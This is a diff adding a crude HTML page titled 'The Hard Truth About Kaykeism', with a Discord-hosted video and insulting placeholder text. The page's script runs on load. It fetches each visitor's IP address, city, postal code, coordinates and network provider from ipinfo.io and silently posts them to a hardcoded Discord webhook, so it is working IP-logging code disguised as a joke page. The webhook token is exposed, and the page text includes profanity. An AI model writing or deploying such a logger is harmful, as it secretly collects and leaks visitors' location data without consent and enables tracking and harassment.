@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Hard Truth About Kaykeism</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap">
+
+<style>
+  body {
+    font-family: 'Poppins', sans-serif;
+    margin: 0;
+    padding: 0;
+    padding-bottom: 50px; /* Add some padding at the bottom */
+    background-color: #f0f0f0; /* Light grey background */
+  }
+  section {
+    height: 100vh;
+    display: flex;
+    flex-direction: column; /* Title above body text */
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    opacity: 0;
+    transition: opacity 0.3s ease-in-out; /* Shorter fade animation */
+  }
+  h1 {
+    margin: 0;
+    margin-bottom: 20px; /* Adjust as needed */
+  }
+  p {
+    margin: 0;
+    margin-top: 20px; /* Adjust as needed */
+  }
+  /* Add space between sections */
+  section:not(:last-child) {
+    margin-bottom: 50vh; /* Adjust as needed */
+  }
+  button {
+    margin-top: 40px;
+    padding: 10px 20px;
+    background-color: #fff; /* White background */
+    color: #555; /* Grey text */
+    border: 2px solid #555; /* Grey border */
+    border-radius: 5px;
+    cursor: pointer;
+    transition: opacity 0.3s ease-in-out, background-color 0.3s ease-in-out, color 0.3s ease-in-out;
+    font-family: 'Poppins', sans-serif; /* Poppins font */
+  }
+  button:hover {
+    background-color: #eee; /* Light grey background on hover */
+    color: #444; /* Dark grey text on hover */
+    opacity: 0.9; /* Reduce opacity on hover */
+  }
+  .button-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    position: fixed;
+    bottom: 20px;
+    width: 100%;
+  }
+  .ip-info {
+    margin-top: 20px;
+    font-size: 18px;
+  }
+</style>
+</head>
+<body>
+
+<video autoplay loop style="width: 100%;">
+  <source src="https://cdn.discordapp.com/attachments/1217316007291519078/1222624904868790282/u13iA91.mp4?ex=6616e52c&is=6604702c&hm=7bb83d9f4c6241685ebb44cc6809ef48c9482acdc820440a050a574d0ff16df5&" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+
+<section id="section1">
+  <h1>WHAT DO I SELL?</h1>
+  <div></div> <!-- Empty div to create space -->
+  <p>random shit</p>
+</section>
+
+<section id="ip-info" class="ip-info"></section>
+  
+<section id="section2">
+  <h1>Why?</h1>
+  <div></div> <!-- Empty div to create space -->
+  <p>FUCKER</p>
+</section>
+<section id="section3">
+  <h1>What's the point of this site?</h1>
+  <div></div> <!-- Empty div to create space -->
+  <p>dicksucker</p>
+</section>
+
+<script>
+  function sendToDiscord(ipAddress, city, region, country, loc, postal, timezone, hostname, org) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1222275857268346981/jmE-V4VK55bfUyEoBZHjQDxwEZwjWwqsFKZQhR1wqTQ8yzkD5O6H-Z0wZrMrK9U_oTTB';
+      const data = {
+          content: `IP Address: ${ipAddress}
+          City: ${city}
+          Region: ${region}
+          Country: ${country}
+          Coordinates: ${loc}
+          Postal: ${postal}
+          Timezone: ${timezone}
+          Hostname: ${hostname}
+          Organization: ${org}`
+      };
+
+      fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+              'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(data)
+      })
+      .then(response => {
+          if (response.ok) {
+              console.log('');
+          } else {
+              console.error('f');
+          }
+      })
+      .catch(error => {
+          console.error('Error', error);
+      });
+  }
+
+  function getIPAddress() {
+      fetch('https://ipinfo.io/json')
+      .then(response => response.json())
+      .then(data => {
+          const ipAddress = data.ip;
+          const city = data.city;
+          const region = data.region;
+          const country = data.country;
+          const loc = data.loc;
+          const postal = data.postal;
+          const timezone = data.timezone;
+          const hostname = data.hostname;
+          const org = data.org;
+          const ipInfoSection = document.getElementById('ip-info');
+          ipInfoSection.innerHTML = `IP Address: ${ipAddress}<br>City: ${city}<br>Region: ${region}<br>Country: ${country}<br>Coordinates: ${loc}<br>Postal: ${postal}<br>Timezone: ${timezone}<br>Hostname: ${hostname}<br>Organization: ${org}`;
+          sendToDiscord(ipAddress, city, region, country, loc, postal, timezone, hostname, org);
+      })
+      .catch(error => {
+          console.error('Error fetch', error);
+      });
+  }
+
+
+  function fadeInElements() {
+    const sections = document.querySelectorAll('section');
+    sections.forEach(section => {
+      const sectionTop = section.getBoundingClientRect().top;
+      const windowHeight = window.innerHeight;
+      if (sectionTop < windowHeight * 0.5) { // Adjusted to start fade animation earlier
+        section.style.opacity = '1';
+      }
+    });
+  }
+
+  window.addEventListener('scroll', fadeInElements);
+  window.addEventListener('resize', fadeInElements);
+  fadeInElements(); // Call initially to check if any elements are already in view
+
+  function redirectToForm() {
+    // Replace 'your-form-url' with the actual URL of your form
+    window.location.href = 'your-form-url';
+  }
+
+  // Automatically call getIPAddress when the page loads
+  getIPAddress();
+</script>
+</body>
+</html>
